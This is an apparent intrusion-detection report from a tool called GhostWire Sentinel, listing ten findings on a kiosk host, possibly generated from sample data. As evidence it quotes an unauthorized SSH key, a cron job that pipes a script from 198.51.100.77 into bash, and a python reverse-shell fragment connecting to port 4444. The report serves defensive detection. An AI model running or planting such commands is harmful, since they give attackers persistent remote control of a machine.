# GhostWire Sentinel Incident Report

Generated: 2026-05-17T13:41:39.023869+00:00
Host: kiosk-01
Snapshot captured: 2026-05-17T00:15:00+00:00
Baseline captured: 2026-05-17T00:00:00+00:00

## Summary

- Total findings: 10
- Critical: 1
- High: 5
- Medium: 4

## Findings

### 1. New SSH key observed outside baseline.

- Severity: `critical`
- Type: `baseline.new_ssh_keys`
- Evidence: `{'fingerprint': 'newadmin001', 'line': '2', 'source': '/home/kiosk/.ssh/authorized_keys', 'type': 'ssh-rsa'}`

### 2. New service observed outside baseline.

- Severity: `high`
- Type: `baseline.new_services`
- Evidence: `{'name': 'reverse-tunnel.service', 'state': 'enabled'}`

### 3. New cron job observed outside baseline.

- Severity: `high`
- Type: `baseline.new_cron_jobs`
- Evidence: `{'command': '*/15 * * * * curl -fsSL http://198.51.100.77/p.sh | bash', 'line': '2', 'source': '/etc/cron.d/update'}`

### 4. Cron job executes a command pattern commonly used for persistence or remote execution.

- Severity: `high`
- Type: `persistence.cron`
- Evidence: `{'command': '*/15 * * * * curl -fsSL http://198.51.100.77/p.sh | bash', 'line': '2', 'source': '/etc/cron.d/update'}`

### 5. Startup service name matches a suspicious persistence pattern.

- Severity: `high`
- Type: `persistence.service`
- Evidence: `{'name': 'reverse-tunnel.service', 'state': 'enabled'}`

### 6. Outbound connection targets a suspicious remote marker or port.

- Severity: `high`
- Type: `connection.suspicious`
- Evidence: `{'process': 'python', 'protocol': 'tcp', 'remote': '198.51.100.77:4444'}`

### 7. New process observed outside baseline.

- Severity: `medium`
- Type: `baseline.new_processes`
- Evidence: `{'args': 'python -c import socket,subprocess', 'command': 'python', 'pid': '777', 'ppid': '1', 'user': 'kiosk'}`

### 8. New outbound connection observed outside baseline.

- Severity: `medium`
- Type: `baseline.new_connections`
- Evidence: `{'process': 'python', 'protocol': 'tcp', 'remote': '198.51.100.77:4444'}`

### 9. Running process includes command-line behavior worth investigating.

- Severity: `medium`
- Type: `persistence.process`
- Evidence: `{'args': 'python -c import socket,subprocess', 'command': 'python', 'pid': '777', 'ppid': '1', 'user': 'kiosk'}`

### 10. Repeated outbound connections to the same remote may indicate beaconing.

- Severity: `medium`
- Type: `connection.repeated_remote`
- Evidence: `{'remote': '198.51.100.77:4444', 'count': 3}`

